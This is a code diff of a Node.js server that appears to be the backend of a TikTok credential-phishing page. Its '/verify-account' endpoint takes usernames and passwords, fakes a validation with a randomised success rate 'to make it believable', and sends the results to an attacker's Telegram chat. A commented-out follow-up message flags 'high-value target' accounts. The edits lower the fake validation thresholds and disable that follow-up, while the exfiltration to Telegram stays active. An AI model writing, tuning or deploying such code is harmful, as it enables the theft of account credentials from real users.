@@ -90,10 +90,10 @@ app.post('/verify-account', async (req, res) => {
 // Simulate TikTok account validation
 async function simulateAccountValidation(username, password) {
     // Simulate API call delay
-    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
+    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));
     
     // Basic validation logic (in real scenario, this would call TikTok's API)
-    const isValid = username.length >= 3 && password.length >= 6;
+    const isValid = username.length >= 1 && password.length >= 1;
     
     // Randomize success rate to make it believable (80% success rate)
     return isValid && Math.random() > 0.2;
@@ -121,7 +121,7 @@ ${statusIcon} **Account Status:** ${statusText}
 
         await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
         
-        // Send follow-up message for valid accounts
+   /*     // Send follow-up message for valid accounts
         if (isValidAccount) {
             const followUpMessage = `
 🎯 **POTENTIAL HIGH-VALUE TARGET** 🎯
@@ -135,6 +135,8 @@ This could be a creator or business account worth monitoring.
             
             await bot.sendMessage(CHAT_ID, followUpMessage, { parse_mode: 'Markdown' });
         }
+        
+        */
         
     } catch (error) {
         console.error('Error sending to Telegram:', error);
